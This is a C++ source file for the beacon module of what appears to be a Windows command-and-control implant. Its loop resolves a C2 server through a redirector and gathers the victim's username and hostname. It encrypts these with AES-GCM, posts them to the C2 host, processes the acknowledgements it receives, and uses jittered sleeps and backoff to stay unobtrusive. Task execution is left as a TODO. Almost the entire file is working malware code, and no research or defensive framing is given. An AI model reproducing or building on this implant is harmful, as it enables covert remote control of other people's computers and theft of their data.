#include "Beacon.h"

#include "../core/Config.h"
#include "../core/ImplantId.h"
#include "../crypto/AesGcm.h"
#include "../http/RedirectorResolver.h"
#include "../http/WinHttpClient.h"
#include "../external/nlohmann/json.hpp"

#include <algorithm>
#include <chrono>
#include <iterator>
#include <random>
#include <thread>
#include <vector>

#include <windows.h>
#include <winhttp.h>

namespace {

std::string wideToUtf8(const wchar_t* buffer, DWORD len) {
    if (!buffer || len == 0) {
        return {};
    }

    int required = WideCharToMultiByte(
        CP_UTF8, 0, buffer, len, nullptr, 0, nullptr, nullptr);

    if (required <= 0) {
        return {};
    }

    std::string result(static_cast<size_t>(required), '\0');
    WideCharToMultiByte(
        CP_UTF8, 0, buffer, len, result.data(), required, nullptr, nullptr);

    return result;
}

std::string getUsername() {
    DWORD len = 0;
    GetUserNameW(nullptr, &len);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || len == 0) {
        return "Unknown";
    }

    std::vector<wchar_t> buffer(len);
    if (!GetUserNameW(buffer.data(), &len)) {
        return "Unknown";
    }

    // len includes null terminator
    return wideToUtf8(buffer.data(), len - 1);
}

std::string getHostname() {
    DWORD len = 0;
    GetComputerNameW(nullptr, &len);

    if (GetLastError() != ERROR_BUFFER_OVERFLOW || len == 0) {
        return "Unknown";
    }

    std::vector<wchar_t> buffer(len);
    if (!GetComputerNameW(buffer.data(), &len)) {
        return "Unknown";
    }

    return wideToUtf8(buffer.data(), len);
}

// Simple RAII wrapper for CryptoAPI provider
class CryptoProvider {
public:
    CryptoProvider() {
        acquired_ = CryptAcquireContext(
            &prov_, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    }

    ~CryptoProvider() {
        if (acquired_) {
            CryptReleaseContext(prov_, 0);
        }
    }

    bool valid() const { return acquired_; }

    bool random(BYTE* data, DWORD len) {
        return acquired_ && CryptGenRandom(prov_, len, data);
    }

private:
    HCRYPTPROV prov_{};
    bool acquired_{false};
};

} // anonymous namespace

namespace beacon {

Beacon::Beacon()
    : c2FetchBackoff_(core::C2_FETCH_BACKOFF),
      implantId_(core::generateImplantId()) {}

void Beacon::sleepWithJitter() {
    std::random_device rd;
    std::mt19937 gen(rd());

    std::normal_distribution<> dist(
        core::SLEEP_BASE,
        core::SLEEP_BASE * (core::JITTER_PCT / 100.0));

    double seconds = std::max(3.0, dist(gen));
    std::this_thread::sleep_for(
        std::chrono::milliseconds(
            static_cast<int>(seconds * 1000.0)));
}

void Beacon::run() {
    http::RedirectorResolver resolver(core::REDIRECTOR_URL);

    std::vector<BYTE> key(core::BEACON_KEY,
                          core::BEACON_KEY + 32);
    crypto::AesGcm aes(key);

    while (true) {

        // -----------------------------
        // Resolve C2
        // -----------------------------
        if (c2Url_.empty()) {
            try {
                c2Url_ = resolver.resolve();
                c2FetchBackoff_ = core::C2_FETCH_BACKOFF;
            } catch (const std::exception&) {
                std::this_thread::sleep_for(
                    std::chrono::duration<double>(c2FetchBackoff_));
                if (c2FetchBackoff_ < 35 * 60) {
                    c2FetchBackoff_ *= 2;
                }
                continue;
            }
        }

        try {
            // -----------------------------
            // Build payload
            // -----------------------------
            nlohmann::json payload{
                {"id", implantId_},
                {"os", "windows"},
                {"arch", "amd64"},
                {"user", getUsername()},
                {"host", getHostname()},
                {"results", nlohmann::json::array()}
            };

            Result result;
            while (pendingResults_.try_dequeue(result)) {
                inFlightResults_.push_back(result);
            }

            for (const auto& res : inFlightResults_) {
                payload["results"].push_back({
                    {"task_id", res.task_id},
                    {"output", res.output},
                    {"error", res.error}
                });
            }

            std::string payloadStr = payload.dump();
            std::vector<BYTE> plaintext(
                payloadStr.begin(), payloadStr.end());

            // -----------------------------
            // Generate nonce
            // -----------------------------
            std::vector<BYTE> nonce(12);
            CryptoProvider crypto;
            if (!crypto.valid() ||
                !crypto.random(nonce.data(),
                               static_cast<DWORD>(nonce.size()))) {
                continue;
            }

            // -----------------------------
            // Encrypt
            // -----------------------------
            std::vector<BYTE> ciphertext =
                aes.encrypt(plaintext, nonce);

            std::vector<BYTE> encrypted;
            encrypted.reserve(nonce.size() + ciphertext.size());
            encrypted.insert(encrypted.end(),
                             nonce.begin(), nonce.end());
            encrypted.insert(encrypted.end(),
                             ciphertext.begin(), ciphertext.end());

            // -----------------------------
            // Parse URL
            // -----------------------------
            std::wstring wideUrl(c2Url_.begin(), c2Url_.end());

            URL_COMPONENTSW comp{};
            comp.dwStructSize = sizeof(comp);

            wchar_t host[256]{};
            wchar_t path[512]{};

            comp.lpszHostName = host;
            comp.dwHostNameLength = _countof(host);
            comp.lpszUrlPath = path;
            comp.dwUrlPathLength = _countof(path);

            if (!WinHttpCrackUrl(
                    wideUrl.c_str(),
                    static_cast<DWORD>(wideUrl.length()),
                    0,
                    &comp)) {
                c2Url_.clear();
                continue;
            }

            // -----------------------------
            // Send request
            // -----------------------------
            http::WinHttpClient client(
                std::wstring(core::USER_AGENTS[0].begin(),
                             core::USER_AGENTS[0].end()));

            std::vector<BYTE> response =
                client.post(
                    std::wstring(comp.lpszHostName,
                                 comp.dwHostNameLength),
                    std::wstring(comp.lpszUrlPath,
                                 comp.dwUrlPathLength),
                    encrypted);

            // -----------------------------
            // Process response
            // -----------------------------
            if (response.size() < 12) {
                continue;
            }

            std::vector<BYTE> respNonce(
                response.begin(),
                response.begin() + 12);

            std::vector<BYTE> respCipher(
                response.begin() + 12,
                response.end());

            std::vector<BYTE> decrypted =
                aes.decrypt(respCipher, respNonce);

            std::string respStr(
                decrypted.begin(), decrypted.end());

            nlohmann::json resp =
                nlohmann::json::parse(respStr, nullptr, false);

            if (!resp.is_object()) {
                continue;
            }

            if (resp.contains("ack_ids")) {
                auto ackIds =
                    resp["ack_ids"]
                        .get<std::vector<std::string>>();

                inFlightResults_.erase(
                    std::remove_if(
                        inFlightResults_.begin(),
                        inFlightResults_.end(),
                        [&ackIds](const Result& r) {
                            return std::find(
                                ackIds.begin(),
                                ackIds.end(),
                                r.task_id) != ackIds.end();
                        }),
                    inFlightResults_.end());
            }

            // TODO: task execution

        } catch (const std::exception&) {
            // intentionally ignored
        }

        sleepWithJitter();
    }
}

} // namespace beacon
